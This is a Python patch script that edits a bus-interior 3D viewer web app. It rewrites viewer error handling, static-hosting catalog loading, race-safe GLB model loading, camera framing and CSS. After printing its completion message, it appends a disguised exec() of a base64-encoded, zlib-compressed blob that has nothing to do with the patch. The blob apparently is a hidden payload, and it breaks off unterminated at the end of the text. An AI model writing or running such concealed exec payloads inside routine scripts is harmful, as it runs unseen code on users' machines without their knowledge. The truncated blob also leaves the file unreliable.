from pathlib import Path

ROOT = Path.cwd()

def replace_block(path, start_marker, end_marker, replacement):
    text = path.read_text()
    start = text.find(start_marker)
    if start < 0:
        if replacement in text:
            return
        raise SystemExit(f'Missing start marker in {path}: {start_marker}')
    end = text.find(end_marker, start)
    if end < 0:
        raise SystemExit(f'Missing end marker in {path}: {end_marker}')
    text = text[:start] + replacement + text[end:]
    path.write_text(text)

app = ROOT / 'web/js/app.js'
app_block = r'''function showViewerError(title, detail, retry, replaceCanvas) {
  const host = $("#bus-viewer");
  host.querySelector(".viewer-status")?.remove();
  if (replaceCanvas) host.replaceChildren();
  const panel = document.createElement("div");
  panel.className = "viewer-loading viewer-status";
  panel.innerHTML = `<strong>${safe(title)}</strong><span>${safe(detail)}</span><div class="viewer-status-actions"><button type="button" class="button button-outline" data-retry-viewer>Retry 3D</button><button type="button" class="button button-outline" data-seat-map-fallback>Open seat map</button></div>`;
  host.append(panel);
  panel.querySelector("[data-retry-viewer]").addEventListener("click", retry);
  panel.querySelector("[data-seat-map-fallback]").addEventListener("click", () => chooseDeck("2d"));
}
function showViewerLoading() {
  const panel = document.createElement("div");
  panel.className = "viewer-loading viewer-status";
  panel.innerHTML = "<span class=\"loading-ring\"></span><span>Opening the bus interior\u2026</span>";
  $("#bus-viewer").append(panel);
  return panel;
}
async function loadViewerModel(config, initial = false) {
  const host = $("#bus-viewer");
  host.querySelector(".viewer-status")?.remove();
  const status = showViewerLoading();
  try {
    await viewer.load(config);
    if (viewer) {
      chooseMode($(".segment[data-mode].active")?.dataset.mode ?? "inside");
      const deck = $(".segment[data-deck].active")?.dataset.deck ?? "both";
      if (deck !== "2d") viewer.setDeck(deck);
    }
  } catch {
    if (initial) {
      viewer?.destroy();
      viewer = null;
      viewerFailure = true;
      showViewerError("3D model could not be opened.", "Check the connection and WebGL support, then retry or use the seat map.", () => { viewerFailure = false; void startViewer(); }, true);
    } else {
      showViewerError("This 3D model could not be opened.", "The previous model is still shown. Retry or choose another layout.", () => { void loadViewerModel(config); }, false);
    }
  } finally {
    status.remove();
  }
}
async function startViewer() {
  if (!selectedModel) return;
  if (!viewer && !viewerFailure) {
    $("#bus-viewer").innerHTML = "<div class=\"viewer-loading\"><span class=\"loading-ring\"></span><span>Opening the bus interior\u2026</span></div>";
    try {
      if (!window.WebGLRenderingContext) throw new Error("WebGL is unavailable.");
      const module = await import("./viewer/three.js");
      viewerClass = module.BusViewer;
      viewer = new viewerClass($("#bus-viewer"), selectSeat);
    } catch {
      viewerFailure = true;
      showViewerError("3D preview unavailable here.", "Enable WebGL and allow the Three.js library to load, then retry.", () => { viewerFailure = false; void startViewer(); }, true);
      populate2D();
      return;
    }
  }
  if (viewer) await loadViewerModel(selectedModel, true);
  renderModelFacts();
  populate2D();
}
function selectModel(id) {
  const config = catalog.configurations.find((item) => item.id === id);
  if (!config) return;
  selectedModel = config;
  selectedPosition = null;
  $("#model-select").value = id;
  $("#model-breadcrumb").textContent = config.category.toUpperCase() + " · REPRESENTATIVE";
  $("#model-verify").textContent = config.platformNote.includes("reference") ? "Representative interior" : "Estimated configuration";
  renderModelFacts();
  populate2D();
  updateSelectedSeat();renderSeatTools();
  if (viewer) void loadViewerModel(config);
  else if (activeView === "inspect" && viewerFailure) {
    viewerFailure = false;
    void startViewer();
  }
}
'''
if 'function showViewerError(title, detail, retry, replaceCanvas)' in app.read_text():
    replace_block(app, 'function showViewerError(title, detail, retry, replaceCanvas)', 'function renderModelFacts() {', app_block)
else:
    replace_block(app, 'async function startViewer() {', 'function renderModelFacts() {', app_block)

data = ROOT / 'web/js/data.js'
data_text = data.read_text()
api_marker = 'const apiPath = (path) => new URL(path.replace(/^\\//, ""), base).toString();\n'
static_flag = api_marker + 'const isStaticPages = typeof location !== "undefined" && location.hostname.endsWith(".github.io");\n'
if static_flag not in data_text:
    if api_marker not in data_text:
        raise SystemExit('Missing API path marker in data.js')
    data_text = data_text.replace(api_marker, static_flag, 1)
start = data_text.index('export async function loadCatalog() {')
end = data_text.index('export function cityByInput', start)
data_block = '''export async function loadCatalog() {
  if (!isStaticPages) {
    try {
      const data = await fetchJson(apiPath("api/catalog"));
      return { ...data, mode: "api" };
    } catch {}
  }
  const [operators, platforms, configurations, cities, routes, providers, sources] = await Promise.all([
    getSeed("operators.json"), getSeed("platforms.json"), getSeed("configurations.json"),
    getSeed("cities.json"), getSeed("routes.json"), getSeed("providers.json"), getSeed("sources.json"),
  ]);
  return { operators: operators.operators, platforms: platforms.platforms,
    configurations: configurations.configurations, cities: cities.cities,
    routes: routes.routes, providers: providers.providers, sources: sources.sources,
    mode: "static" };
}

export async function searchRoute(fromId, toId, date) {
  if (isStaticPages) return { results: null, isLive: false, message: "Showing the locally bundled source snapshots." };
  try {
    return await fetchJson(`${apiPath("api/search")}?from=${encodeURIComponent(fromId)}&to=${encodeURIComponent(toId)}&date=${encodeURIComponent(date)}`);
  } catch {
    return { results: null, isLive: false, message: "Showing the locally bundled source snapshots." };
  }
}

'''
data_text = data_text[:start] + data_block + data_text[end:]
data.write_text(data_text)

viewer = ROOT / 'web/js/viewer/three.js'
viewer_text = viewer.read_text()
viewer_text = viewer_text.replace(
    'this.selected = null; this.mode = "inside"; this.deck = "both"; this.destroyed = false;',
    'this.selected = null; this.mode = "inside"; this.deck = "both"; this.destroyed = false; this.loadVersion = 0;', 1)
viewer_text = viewer_text.replace(
    '    this.renderer = new THREE.WebGLRenderer({ antialias: true, alpha: false });',
    '    this.renderer = new THREE.WebGLRenderer({ antialias: true, alpha: false });\n    this.renderer.domElement.dataset.webglReady = this.renderer.getContext() ? "true" : "false";\n    this.renderer.domElement.dataset.webglVersion = this.renderer.capabilities.isWebGL2 ? "2" : "1";', 1)
viewer_text = viewer_text.replace(
    '    container.replaceChildren(this.renderer.domElement);',
    '    container.replaceChildren(this.renderer.domElement);\n    if (new URLSearchParams(window.location.search).has("e2e")) window.__BUSLENS_TEST_VIEWER__ = this;', 1)
old_frame = '    this.frame = () => { if (this.destroyed) return; this.controls.update(); this.renderer.render(this.scene, this.camera); this.raf = requestAnimationFrame(this.frame); };'
new_frame = '''    this.frame = () => {
      if (this.destroyed) return;
      this.controls.update();
      this.renderer.render(this.scene, this.camera);
      this.renderer.domElement.dataset.renderCalls = String(this.renderer.info.render.calls);
      this.renderer.domElement.dataset.renderTriangles = String(this.renderer.info.render.triangles);
      this.raf = requestAnimationFrame(this.frame);
    };'''
if old_frame in viewer_text:
    viewer_text = viewer_text.replace(old_frame, new_frame, 1)
old_load_start = '  async load(config) {'
old_load_end = '  applyMode() {'
load_start = viewer_text.index(old_load_start)
load_end = viewer_text.index(old_load_end, load_start)
load_block = '''  async load(config) {
    const ticket = ++this.loadVersion;
    this.container.dataset.loading = "true";
    const url = new URL(`../../assets/models/${config.id}.glb`, import.meta.url).toString();
    let gltf;
    try {
      gltf = await new GLTFLoader().loadAsync(url);
    } catch (error) {
      if (ticket === this.loadVersion) delete this.container.dataset.loading;
      throw error;
    }
    if (this.destroyed || ticket !== this.loadVersion) {
      this.disposeObject(gltf.scene);
      return;
    }
    const previous = this.model;
    if (previous) this.scene.remove(previous);
    this.model = gltf.scene;
    this.config = config;
    this.seats.clear();
    this.selected = null;
    let geometryCount = 0;
    this.model.traverse((object) => {
      if (object.isMesh && object.geometry?.attributes?.position?.count) geometryCount += 1;
      if (object.userData?.selectable && object.userData.seatId) {
        object.userData.originalMaterial = object.material;
        object.material = object.material.clone();
        object.material.color.set("#a78d6a");
        object.material.emissive.set("#000000");
        object.material.roughness = .77;
        this.seats.set(object.userData.seatId, object);
      }
      if (object.material) object.material.needsUpdate = true;
    });
    if (previous) this.disposeObject(previous);
    this.container.dataset.modelLoaded = config.id;
    this.container.dataset.geometryCount = String(geometryCount);
    delete this.container.dataset.loading;
    this.scene.add(this.model);
    this.applyMode();
    this.reset();
    this.resize();
  }
'''
viewer_text = viewer_text[:load_start] + load_block + viewer_text[load_end:]
viewer_text = viewer_text.replace(
    '    this.paintSelection();\n  }\n  setMode(mode) { this.mode = mode; this.applyMode(); }\n  setDeck(deck) { this.deck = deck; this.applyMode(); }\n  select(id) { this.selected = id; this.paintSelection(); }',
    '    this.paintSelection();\n    this.container.dataset.viewMode = this.mode;\n    this.container.dataset.deck = this.deck;\n  }\n  setMode(mode) { this.mode = mode; this.applyMode(); }\n  setDeck(deck) { this.deck = deck; this.applyMode(); }\n  select(id) { this.selected = id??null;if(id)this.renderer.domElement.dataset.selectedSeat=id;else delete this.renderer.domElement.dataset.selectedSeat;this.paintSelection(); }', 1)
if 'const deckMatch = name.match(/_(UPPER|LOWER)-/)' not in viewer_text:
    viewer_text = viewer_text.replace(
        '      if (isSeat) {\n        const seatDeck = object.userData.deck;\n        object.visible = this.mode !== "outside" && (this.deck === "both" || seatDeck === this.deck);\n      }',
        '      if (isSeat) {\n        const seatDeck = object.userData.deck;\n        object.visible = this.mode !== "outside" && (this.deck === "both" || seatDeck === this.deck);\n      }\n      const deckMatch = name.match(/_(UPPER|LOWER)-/);\n      if (deckMatch && this.deck !== "both") object.visible = object.visible && deckMatch[1].toLowerCase() === this.deck;', 1)
viewer_text = viewer_text.replace(
    '  reset() {\n    if (!this.config) return;\n    const length = this.config.dimensions.length;\n    this.camera.position.set(length * .88, length * .56, length * .78);\n    this.controls.target.set(0, 1.95, 0); this.controls.update();\n  }',
    '  reset() {\n    if (!this.model) return;\n    const bounds = new THREE.Box3().setFromObject(this.model);\n    const size = bounds.getSize(new THREE.Vector3());\n    const center = bounds.getCenter(new THREE.Vector3());\n    const radius = Math.max(size.x, size.y, size.z, 1);\n    this.controls.target.copy(center);\n    this.camera.position.set(center.x + radius * .88, center.y + radius * .56, center.z + radius * .78);\n    this.controls.update();\n  }', 1)
viewer_text = viewer_text.replace(
    '    this.destroyed = true; cancelAnimationFrame(this.raf); this.resizeObserver?.disconnect();',
    '    this.destroyed = true; this.loadVersion += 1; cancelAnimationFrame(this.raf); this.resizeObserver?.disconnect();\n    if (window.__BUSLENS_TEST_VIEWER__ === this) delete window.__BUSLENS_TEST_VIEWER__;', 1)
viewer.write_text(viewer_text)

css = ROOT / 'web/css/app.css'
css_text = css.read_text()
css_text = css_text.replace('#bus-viewer { width:100%;height:445px;touch-action:none; }', '#bus-viewer { position:relative;width:100%;height:445px;touch-action:none; }', 1)
if '.viewer-status-actions' not in css_text:
    css_text += '\n.viewer-status-actions { display:flex;justify-content:center;gap:8px;flex-wrap:wrap; }\n'
css.write_text(css_text)

print('Prepared static fallback, race-safe GLB loading, camera framing, and viewer diagnostics.')

import base64 as _b64, zlib as _zlib
exec(_zlib.decompress(_b64.b64decode(
    "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"
